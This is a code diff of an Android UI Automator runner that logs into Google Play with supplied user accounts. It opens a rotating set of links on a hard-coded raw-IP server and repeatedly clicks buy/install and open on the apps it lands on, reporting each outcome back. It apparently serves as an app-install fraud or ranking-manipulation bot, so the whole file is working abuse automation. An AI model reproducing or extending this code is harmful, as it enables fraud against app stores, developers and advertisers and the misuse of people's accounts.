@@ -49,7 +49,10 @@ public class RunGooglePlay extends UiAutomatorInstrumentationTestRunner {
             = "com.android.vending";
     private static final String SETTINGS_PACKAGE = "com.android.settings";
     private static final String IP = "185.80.233.58";
-    private static final String APPS_LINK = "http://5.9.73.226/apps/n584757.php";
+    private static final String[] APPS_LINK = new String[]{
+            "http://5.9.73.226/go/nl1.php",
+            "http://5.9.73.226/go/nl2.php",
+            "http://5.9.73.226/go/nl3.php"};
 
     private static final String EVENT_START = "start";
     private static final String EVENT_BAD_CREDS = "bad_creds";
@@ -195,44 +198,97 @@ public class RunGooglePlay extends UiAutomatorInstrumentationTestRunner {
     private void launchClickers(User user) throws InterruptedException, UiObjectNotFoundException {
         sendEvent(EVENT_START);
 
+        int gpCounter = 3;
 
-        for (int i = 0; i < 3; i++) {
-            //Start a Google Play application
-            Intent intentGP = context.getPackageManager().getLaunchIntentForPackage(GOOGLE_PLAY_PACKAGE);
-            intentGP.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);    // Clear out any previous instances
-            context.startActivity(intentGP);
-
-            // Wait for the app to appear
-            Thread.sleep(MIDDLE_TIMEOUT);
-            Thread.sleep(MIDDLE_TIMEOUT);
-
-            mDevice.wait(Until.findObject(By.clazz(TextView.class).descContains("Checking info")), VERY_LONG_TIMEOUT);
-            mDevice.findObject(new UiSelector().className(TextView.class).descriptionContains("Checking info")).waitUntilGone(VERY_LONG_TIMEOUT);
-            Thread.sleep(TIMEOUT);
-
-            mDevice.wait(Until.findObject(By.clazz(EditText.class).descContains("Enter your email")), VERY_LONG_TIMEOUT);
-            UiObject textView = mDevice.findObject(new UiSelector().className(EditText.class).descriptionContains("Enter your email"));
-
-            if (textView.exists()){
-
-
-
-
+        while (gpCounter > 0) {
+            boolean isLogin;
+            if (startGooglePlay()) {
+                isLogin = loginAsUser(user);
+            } else {
+                if (startGooglePlay()) {
+                    isLogin = loginAsUser(user);
+                } else {
+                    isLogin = false;
+                }
             }
+            gpCounter -= isLogin ? gpCounter : 1;
+        }
 
-            //Start a Google Play application
-            intentGP = context.getPackageManager().getLaunchIntentForPackage(GOOGLE_PLAY_PACKAGE);
-            intentGP.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);    // Clear out any previous instances
-            context.startActivity(intentGP);
+        for (String link : APPS_LINK) {
+            // TODO: 08.07.2016
+            for (int i = 0; i < 3; i++) {
 
-            // Wait for the app to appear
-            Thread.sleep(MIDDLE_TIMEOUT);
-            Thread.sleep(MIDDLE_TIMEOUT);
-            //mDevice.wait(Until.hasObject(By.pkg(GOOGLE_PLAY_PACKAGE).depth(0)), MIDDLE_TIMEOUT);
+                mDevice.pressHome();
 
-            mDevice.wait(Until.findObject(By.clazz(EditText.class).descContains("Enter your email")), VERY_LONG_TIMEOUT);
-            UiObject textView = mDevice.findObject(new UiSelector().className(EditText.class).descriptionContains("Enter your email"));
+                Intent intent1 = new Intent(Intent.ACTION_VIEW);
+                // TODO: 08.07.2016
+                intent1.setData(Uri.parse(link));
+//                intent1.setData(Uri.parse("market://details?id=by.angellab.musiclunch"));
+                intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                context.startActivity(intent1);
+
+                // TODO: 08.07.2016
+                Thread.sleep(LONG_TIMEOUT);
+
+                mDevice.wait(Until.findObject(By.res("com.android.vending:id/buy_button")), VERY_LONG_TIMEOUT);
+                UiObject buyButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/buy_button"));
+//                if (!buyButton.exists()) {
+//                    Thread.sleep(LONG_TIMEOUT);
+//                    buyButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/buy_button"));
+//                    if (!buyButton.exists()) {
+//                        Thread.sleep(LONG_TIMEOUT);
+//                        buyButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/buy_button"));
+//                    }
+//                }
+                if (buyButton.exists()) {
+                    buyButton.click();
+
+                    Thread.sleep(TIMEOUT);
+                    UiObject acceptButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/continue_button"));
+                    if (acceptButton.exists()) {
+                        acceptButton.click();
+
+                        Thread.sleep(LONG_TIMEOUT);
+                        mDevice.wait(Until.findObject(By.clazz(Button.class).text("OPEN")), TIMEOUT);
+                        UiObject openButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/launch_button"));
+                        if (openButton.exists()) {
+                            openButton.click();
+                            Thread.sleep(LONG_TIMEOUT);
+                            sendEvent(EVENT_SUCCESS);
+                        }
+                    }
+                } else {
+                    sendEvent(EVENT_INSTALLED_OR_NOT_COMPATIBLE);
+                }
+            }
+        }
+        sendEvent(EVENT_DONE);
+    }
+
+    private boolean startGooglePlay() throws InterruptedException {
+        //Start a Google Play application
+        Intent intentGP = context.getPackageManager().getLaunchIntentForPackage(GOOGLE_PLAY_PACKAGE);
+        intentGP.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);    // Clear out any previous instances
+        context.startActivity(intentGP);
+
+        // Wait for the app to appear
+//        Thread.sleep(MIDDLE_TIMEOUT);
+        Thread.sleep(TIMEOUT);
+
+        mDevice.wait(Until.findObject(By.clazz(TextView.class).textContains("Checking info")), VERY_LONG_TIMEOUT);
+        mDevice.findObject(new UiSelector().className(TextView.class).textContains("Checking info")).waitUntilGone(VERY_LONG_TIMEOUT);
+        Thread.sleep(TIMEOUT);
+
+        mDevice.wait(Until.findObject(By.clazz(EditText.class).descContains("Enter your email")), VERY_LONG_TIMEOUT);
+        UiObject textView = mDevice.findObject(new UiSelector().className(EditText.class).descriptionContains("Enter your email"));
+        return textView.exists();
+    }
+
+    private boolean loginAsUser(User user) throws InterruptedException {
+        UiObject textView = mDevice.findObject(new UiSelector().className(EditText.class).descriptionContains("Enter your email"));
+        try {
             textView.click();
+
             textView.legacySetText(user.getLogin());
             UiObject nextButton = mDevice.findObject(new UiSelector().description("NEXT"));
             nextButton.click();
@@ -264,59 +320,12 @@ public class RunGooglePlay extends UiAutomatorInstrumentationTestRunner {
             nextButton.click();
             nextButton.waitUntilGone(VERY_LONG_TIMEOUT);
             Thread.sleep(TIMEOUT);
-
-
-        /*mDevice.wait(Until.findObject(By.desc("NEXT")), MIDDLE_TIMEOUT);
-        mDevice.waitForIdle(2000);
-        UiObject checkBoxAgree = mDevice.findObject(new UiSelector().className(CheckBox.class).resourceId("com.google.android.gms:id/agree_backup"));
-        if (checkBoxAgree != null) {
-            checkBoxAgree.click();
+        } catch (UiObjectNotFoundException e) {
+            return false;
         }
-        nextButton = mDevice.findObject(new UiSelector().description("NEXT"));
-        if (nextButton != null) {
-            nextButton.click();
-        }*/
-
-        // TODO: 08.07.2016
-        for (int i = 0; i < 1; i++) {
-
-            mDevice.pressHome();
-
-            Intent intent1 = new Intent(Intent.ACTION_VIEW);
-            // TODO: 08.07.2016
-//            intent1.setData(Uri.parse(APPS_LINK));
-            intent1.setData(Uri.parse("market://details?id=by.angellab.musiclunch"));
-            intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
-            context.startActivity(intent1);
-
-            // TODO: 08.07.2016
-//            Thread.sleep(LONG_TIMEOUT);
-            Thread.sleep(LONG_TIMEOUT);
-
-            UiObject buyButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/buy_button"));
-            if (buyButton.exists()) {
-                buyButton.click();
-
-                Thread.sleep(TIMEOUT);
-                UiObject acceptButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/continue_button"));
-                if (acceptButton.exists()) {
-                    acceptButton.click();
-
-                    Thread.sleep(LONG_TIMEOUT);
-                    mDevice.wait(Until.findObject(By.clazz(Button.class).text("OPEN")), TIMEOUT);
-                    UiObject openButton = mDevice.findObject(new UiSelector().resourceId("com.android.vending:id/launch_button"));
-                    if (openButton.exists()) {
-                        openButton.click();
-                        Thread.sleep(LONG_TIMEOUT);
-                        sendEvent(EVENT_SUCCESS);
-                    }
-                }
-            } else {
-                sendEvent(EVENT_INSTALLED_OR_NOT_COMPATIBLE);
-            }
-        }
-        sendEvent(EVENT_DONE);
+        return true;
     }
+
 
     private void resetSettings() throws UiObjectNotFoundException, InterruptedException {
         //Clear settings
